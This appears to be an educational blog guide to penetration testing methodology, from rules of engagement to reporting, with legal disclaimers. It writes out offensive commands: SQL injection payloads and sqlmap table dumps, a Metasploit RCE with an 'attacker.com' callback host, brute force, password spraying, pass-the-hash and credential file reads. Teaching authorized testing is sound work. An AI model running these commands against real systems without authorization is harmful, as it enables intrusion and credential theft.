Penetration testing is both an art and a science. I've been conducting pentests for years, and what I've learned is that methodology matters more than tools. Anyone can run a vulnerability scanner. What separates a good pentester from a script kiddie is the ability to think like an attacker‚Äîto chain vulnerabilities, understand business context, and find what automated tools miss.

This guide covers the complete penetration testing methodology, from initial scoping through final reporting. Whether you're preparing for a certification, starting a career in offensive security, or looking to understand what pentesters do so you can better defend, this is for you.

Legal Disclaimer: Penetration testing without explicit written authorization is illegal. Always obtain proper authorization (scope document, rules of engagement) before testing any systems. This guide is for educational purposes and authorized security testing only.

Phase 1: Planning & Reconnaissance

The first phase is the most important. A pentest without proper planning is just hacking. Reconnaissance (recon) is where you gather intelligence about your target‚Äîthe more you know, the more effective your attacks.

Pre-Engagement: Rules of Engagement

Before any testing begins, establish:

  • Scope: What's in scope? (IP ranges, domains, applications)
  • Rules: What's off-limits? (production systems, specific hours)
  • Authorization: Written permission signed by appropriate authority
  • Timeline: Start/end dates, reporting deadlines
  • Communication: Emergency contacts, status update frequency
  • Test Type: Black box, gray box, or white box?
Test Types Explained:
  • Black Box: Zero prior knowledge‚Äîsimulates external attacker
  • Gray Box: Some knowledge (credentials, architecture)‚Äîmost realistic
  • White Box: Full access to source code, designs‚Äîthorough but time-intensive

Passive Reconnaissance

Gather information without directly touching the target:

OSINT Sources:

  • DNS Records: Subdomains, mail servers, name servers
  • WHOIS: Domain registration, contact info, registrar
  • Google Dorking: site:target.com filetype:pdf
  • Shodan/Censys: Internet-facing services, banners, certificates
  • Social Media: Employee info, tech stack hints, leaked credentials
  • GitHub: Exposed secrets, internal code, API keys
  • Wayback Machine: Historical site versions, removed pages

Active Reconnaissance

Direct interaction with target systems (may be detected):

# DNS Enumeration
dig target.com ANY
dig axfr @ns1.target.com target.com  # Zone transfer attempt

# Subdomain Brute Force
gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt

# Web Technology Fingerprinting
whatweb https://target.com
wappalyzer (browser extension)

Phase 2: Scanning & Enumeration

Now we actively probe the target to discover services, versions, and potential vulnerabilities. This is where we move from "who are they" to "what are they running."

Network Scanning

Port Scanning with Nmap:

# Quick scan - top 1000 ports
nmap -sV -sC -oA scan_results target.com

# Full TCP scan - all 65535 ports
nmap -p- -sV -sC -oA full_scan target.com

# UDP scan (slower, often forgotten)
nmap -sU --top-ports 100 target.com

# Aggressive scan with OS detection
nmap -A -T4 target.com

# Stealth scan (SYN scan)
nmap -sS -Pn target.com

Critical ports to look for:

  • 21 (FTP): Anonymous access? Outdated version?
  • 22 (SSH): Version, auth methods, weak keys
  • 23 (Telnet): Cleartext credentials‚Äîalways a finding
  • 25/587 (SMTP): Open relay? User enumeration?
  • 80/443 (HTTP/S): Web applications‚Äîbiggest attack surface
  • 445 (SMB): EternalBlue? Null sessions?
  • 3389 (RDP): BlueKeep? Weak credentials?
  • 3306/5432 (MySQL/PostgreSQL): Exposed databases?

Web Application Scanning

Web apps are where most vulnerabilities live. Focus here.

Directory & File Enumeration:

# Gobuster - directory brute forcing
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt

# Feroxbuster (faster, recursive)
feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# FFUF - fuzzing tool
ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302

Vulnerability Scanning:

# Nikto - web vulnerabilities
nikto -h https://target.com

# Nuclei - template-based scanner
nuclei -u https://target.com -t cves/ -t vulnerabilities/

# WPScan - WordPress specific
wpscan --url https://target.com --enumerate p,u

Service Enumeration

SMB Enumeration (Windows):

# Enum4linux
enum4linux -a target.com

# SMBClient - list shares
smbclient -L //target.com -N

# CrackMapExec - swiss army knife
crackmapexec smb target.com -u '' -p '' --shares

LDAP/Active Directory:

# LDAP anonymous bind
ldapsearch -x -H ldap://target.com -b "DC=target,DC=com"

# BloodHound collection (with creds)
bloodhound-python -u user -p pass -d target.com -c All

Phase 3: Exploitation

This is where we attempt to gain access. The key is to prioritize‚Äîattack the most likely-to-succeed vectors first.

Attack Prioritization

  1. Default/Weak Credentials: admin:admin, root:root, etc.
  2. Known CVEs: Unpatched vulnerabilities with public exploits
  3. Misconfigurations: Open shares, anonymous access, exposed admin panels
  4. Web Application Flaws: SQLi, RCE, SSRF, auth bypass
  5. Password Attacks: Brute force, spray, credential stuffing

Common Exploitation Techniques

SQL Injection:

# Manual testing
' OR '1'='1
' UNION SELECT null,null,null--
' AND 1=CONVERT(int,@@version)--

# SQLMap automated exploitation
sqlmap -u "https://target.com/page?id=1" --dbs
sqlmap -u "https://target.com/page?id=1" -D dbname --tables
sqlmap -u "https://target.com/page?id=1" -D dbname -T users --dump

Remote Code Execution:

# Metasploit Framework
msfconsole
use exploit/multi/http/apache_struts_rce
set RHOSTS target.com
set LHOST attacker.com
exploit

# Find the CVE, find the PoC, modify for your target

Password Attacks:

# Password Spraying (avoid lockouts!)
crackmapexec smb target.com -u users.txt -p 'Summer2025!' --continue-on-success

# Hydra brute force
hydra -l admin -P rockyou.txt target.com ssh

# Hashcat offline cracking
hashcat -m 1000 ntlm_hashes.txt rockyou.txt
Account Lockout Warning: Always check password policies before brute forcing. A good rule: 1 password per 30 minutes per account to avoid lockouts.

Phase 4: Post-Exploitation

You've gained access. Now what? Post-exploitation is about demonstrating impact‚Äîproving what an attacker could do with this access.

Privilege Escalation

Linux Privilege Escalation:

# Automated enumeration
./linpeas.sh
./linux-smart-enumeration.sh

# Manual checks
sudo -l                    # What can I sudo?
find / -perm -4000 2>/dev/null  # SUID binaries
cat /etc/crontab          # Cron jobs
ls -la /etc/passwd /etc/shadow  # File permissions

# Common escalation paths:
# - Misconfigured sudo
# - Writable cron jobs
# - SUID binaries (GTFOBins)
# - Kernel exploits (DirtyPipe, etc.)

Windows Privilege Escalation:

# Automated enumeration
.\winPEAS.exe
.\PowerUp.ps1; Invoke-AllChecks

# Manual checks
whoami /priv              # Token privileges
net localgroup administrators  # Local admins
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer  # AlwaysInstallElevated

# Common escalation paths:
# - Unquoted service paths
# - Weak service permissions
# - AlwaysInstallElevated
# - Token impersonation (Potato attacks)
# - Cached credentials

Lateral Movement

Move from one compromised system to others:

# Pass-the-Hash
crackmapexec smb 10.0.0.0/24 -u admin -H 'aad3b435b51404eeaad3b435b51404ee:hash'

# WMI Exec
impacket-wmiexec admin:password@target.com

# PSExec
impacket-psexec admin:password@target.com

# Evil-WinRM (Windows Remote Management)
evil-winrm -i target.com -u admin -p password

Data Exfiltration (Proof of Concept)

Demonstrate what sensitive data you can access:

  • Credentials: SAM database, LSA secrets, cached creds
  • Sensitive Files: Config files, databases, PII
  • Active Directory: Domain controller access, KRBTGT hash
Ethical Note: In a real pentest, you demonstrate access‚Äîyou don't actually exfiltrate customer data. Take screenshots, document paths, and stop there.

Phase 5: Reporting

The report is the deliverable. A pentest without a good report is worthless. Your report should be actionable‚Äîthe client should know exactly what to fix.

Report Structure

  1. Executive Summary: High-level overview for management (1-2 pages)
  2. Methodology: What you tested and how
  3. Findings Summary: Table of vulnerabilities by severity
  4. Detailed Findings: Each vulnerability with:
    • Description
    • Risk rating (CVSS or custom)
    • Affected systems
    • Evidence (screenshots, logs)
    • Remediation steps
  5. Appendices: Raw scan results, wordlists used, timeline

Sample Finding Format:

Finding: SQL Injection in Login Form

Severity: Critical (CVSS 9.8)
Affected: https://target.com/login

Description: The login form is vulnerable to SQL injection, allowing an attacker to bypass authentication and extract database contents including user credentials.

Evidence: [Screenshot of SQLMap extracting users table]

Recommendation: Use parameterized queries or prepared statements. Input validation alone is insufficient.

My Personal Pentesting Tips

After years of pentesting, here's what I wish someone had told me earlier:

Pro Tips:
  1. Document everything - You will forget what you did. Screenshots, notes, timestamps.
  2. Manual > Automated - Scanners miss things. Always do manual testing.
  3. Think business impact - "I got SQL injection" is less impactful than "I extracted 1M customer records."
  4. Check default credentials FIRST - You'd be surprised how often this works.
  5. Don't break things - A crashed production server ends the engagement.
  6. Know when to stop - Domain admin in 2 hours? Stop, document, report.
  7. Read error messages - They often leak valuable information.
  8. Build relationships - The defensive team isn't your enemy.

Certifications & Learning Path

Want to pursue pentesting professionally? Here's a recommended path:

  • Beginner: CompTIA Security+, eJPT (eLearnSecurity Junior PT)
  • Intermediate: CEH, CompTIA PenTest+, PNPT (Practical Network PT)
  • Advanced: OSCP (Offensive Security Certified Professional)
  • Expert: OSCE3, OSEP, CRTO (Certified Red Team Operator)

Conclusion

Penetration testing is a continuous learning journey. The tools change, the vulnerabilities evolve, but the methodology remains constant: plan, discover, exploit, prove impact, report.

The best pentesters I know aren't just technically skilled‚Äîthey're curious, persistent, and think creatively. They ask "what if?" and don't stop at the first roadblock.

Go break things (legally), and help make the digital world a little more secure.
